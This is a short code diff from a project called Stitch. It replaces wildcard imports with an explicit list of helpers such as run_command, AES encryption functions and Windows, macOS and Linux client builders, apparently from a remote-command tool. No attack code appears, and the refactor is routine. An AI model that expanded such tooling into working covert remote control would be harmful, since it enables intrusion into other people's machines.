@@ -3,12 +3,16 @@ import os
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .stitch_help import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .stitch_utils import *
+# Specific imports from stitch_help
+# (stitch_help contains only usage functions, no specific imports needed)
+# Specific imports from stitch_utils
+from .stitch_utils import (
+    st_print, run_command, start_command, no_error, encrypt, decrypt, show_aes, add_aes,
+    windows_client, osx_client, linux_client, print_yellow, print_blue, print_cyan,
+    print_green, print_red, get_cwd, display_banner, clear_screen, check_int,
+    append_slash_if_dir, find_patterns, find_path, find_completion, progress_bar,
+    print_border, st_logger, nostdout, convertSize, zipdir
+)
 
 def st_recvall(client, count, aes_enc=None, encryption=True):
     buf = b''
